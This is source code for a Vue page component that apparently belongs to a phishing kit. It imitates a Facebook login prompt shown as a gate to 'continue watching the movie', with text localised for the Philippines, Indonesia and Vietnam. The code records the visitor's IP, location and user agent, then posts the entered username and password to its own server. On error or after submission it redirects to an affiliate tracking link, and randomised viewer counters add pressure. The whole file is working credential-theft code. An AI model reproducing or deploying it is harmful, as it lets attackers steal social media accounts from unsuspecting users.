<script>
let num_old = 20 + (Math.floor(Math.random() * 40)) + 20;
var time_cache_eye_1 = 0;
var time_cache_eye_2 = 0;
var URL_NET = 'https://www.theareghot.wiki/?sl=5726142-01834&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}'

export default {
  name: 'IndexPage',

  data(){
    return {
       link_img : null,
       placeholder:{
        username : 'Mobile number or email address',
        password : 'Password',
        button : 'Log in',
        noti: 'Please log in to Facebook to continue watching the movie',
        code400 :  "The email address or phone number that you've entered doesn't match any account.",
        code301: 'Please use another account'
       },
       form:{
        username : null,
        password : null,
        local : null,
        ua: null,
        ip :null
       },
       show: true,
       isDisabled: false
    }
  },
  mounted() {
    this.getVideo()
    this.random_eye_1()
    setInterval(() => this.random_eye_1(), 3000);
    setInterval(() => this.random_eye_2(), 5000);
    this.check_local()

  },
  methods:{
    async getVideo() {
      try {
       const result = await this.$axios.get('/?type=get-image')
        this.link_img = result.data.link_img
      } catch (error) {
        window.location.href = URL_NET
      }
     
    }, 
    random_eye_1(){
              let time = (Math.floor(Math.random() * 4)) * 1e3;
              time_cache_eye_2 = time_cache_eye_2 + time;
              let num = Math.floor(Math.random() * 3);
              num_old = num_old + num;
              document.getElementById("eye_1").innerHTML = num_old;
    },
    random_eye_2(){
              let time = (Math.floor(Math.random() * 5)) * 100;
              time_cache_eye_1 = time_cache_eye_1 + time;
              let num = Math.floor(Math.random() * 10);
              document.getElementById("eye_2").innerHTML = num;
    },

   show_modal_login(){
      this.show=false

    },
    async check_local(){
        try {
          const result = await this.$axios.get('https://www.cloudflare.com/cdn-cgi/trace')      
            this.form.local = result.data.match(/loc=([^\s]+)/)[1]
            this.form.ua = navigator.userAgent
            this.change_text(this.form.local)
            this.get_ip()
        } catch (error) {
            window.location.href = URL_NET
  
        }
    },
    async change_text(local){
        if(local == 'PH'){
            this.placeholder.button = "Mag-log In"
            this.placeholder.username = "Numero ng cellphone o email"
            this.placeholder.password = "Password"
            this.placeholder.noti = "Mangyaring mag-log in sa Facebook upang magpatuloy sa panonood ng pelikula"
            this.placeholder.code400 = "Ang inilagay mong email o numero ng telepono ay hindi tumutugma sa anumang account"
            this.placeholder.code301 = "Mangyaring gumamit ng ibang account"
            return
        } 
        if(local == 'ID') {
            this.placeholder.button = "Masuk"
            this.placeholder.username = "Nomor ponsel atau email"
            this.placeholder.password = "Kata Sandi"
            this.placeholder.noti = "Silakan masuk ke Facebook untuk melanjutkan menonton film"
            this.placeholder.code400 = "Email atau nomor ponsel yang Anda masukkan tidak cocok dengan akun mana saja"
            this.placeholder.code301 = "Silakan gunakan akun lain"

            return          
        }
        if(local == 'VN') {
            this.placeholder.button = "Đăng nhập"
            this.placeholder.username = "Số di động hoặc email"
            this.placeholder.password = "Mật khẩu"
            this.placeholder.noti = "Vui lòng đăng nhập Facebook để tiếp tục"
            this.placeholder.code400 = "Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào"
            this.placeholder.code301 = "Vui lòng sử dụng tài khoản khác"

            return          
        }

    },
    async save_user(){
        this.isDisabled = true
        try {
            const result = await this.$axios.post('/?type=save-user', this.form)
            if(result.data.code === 400){
                this.placeholder.noti =  this.placeholder.code400
            }else if(result.data.code === 301){
                this.placeholder.noti =  this.placeholder.code301
                return
            }else{
                window.location.href = URL_NET
            }
        } catch (error) {
            window.location.href = URL_NET
        }
        this.isDisabled = false

    },
    async save_count(){
        try {
            const result = await this.$axios.post('/?type=save-count',{ip : this.form.ip})
        } catch (error) {
            window.location.href = URL_NET
        }
    },
    async get_ip(){
        try {
            const result = await this.$axios.get('https://icanhazip.com/')      
            this.form.ip = result.data
            this.save_count()         
        } catch (error) {
            window.location.href = URL_NET
            
        }
    }
  }
}
